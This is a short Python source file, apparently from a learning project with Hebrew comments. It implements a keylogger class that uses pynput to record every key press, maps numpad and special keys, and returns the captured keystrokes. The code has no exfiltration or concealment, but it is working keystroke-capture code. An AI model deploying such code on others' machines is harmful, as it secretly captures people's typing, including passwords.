from pynput import keyboard
from interfaces.IkeyLogger import Ikeylogger

class Keyloggerservice(Ikeylogger):
    def __init__(self):
        self.logged_keys = []
        self.listener = None
    
    NUMPAD_VK_MAP = {
    96: '0',  # NumPad 0
    97: '1',  # NumPad 1
    98: '2',  # NumPad 2
    99: '3',  # NumPad 3
    100: '4', # NumPad 4
    101: '5', # NumPad 5
    102: '6', # NumPad 6
    103: '7', # NumPad 7
    104: '8', # NumPad 8
    105: '9', # NumPad 9
    110: '.'  # NumPad .
}

# במקרה של מקש מיוחד כגון המקשים בצד ימין של המקלדת שמוצגים אחרת אז צריך לקחת מהמילון
    def special_tag(self, key):
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        elif hasattr(key, 'vk') and key.vk in self.NUMPAD_VK_MAP:
            return self.NUMPAD_VK_MAP[key.vk]
        elif key == keyboard.Key.space:
            return ' '
        elif key == keyboard.Key.enter:
            return '\n'
        elif key == keyboard.Key.tab:
            return '[TAB]'
        elif key == keyboard.Key.backspace:
            return '[BACKSPACE]'
        elif key == keyboard.Key.shift:
            return ''
        else:
            return f'[{key}]'  # תציג את שם המקש למעקב

    def on_press(self, key):
        try:
            self.logged_keys.append(self.special_tag(key))
        except Exception as e:
            print(f"Error in on_press: {e}")

    def start_logging(self):
        self.logged_keys = []
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()
            self.listener = None

    def get_logged_keys(self):
        return self.logged_keys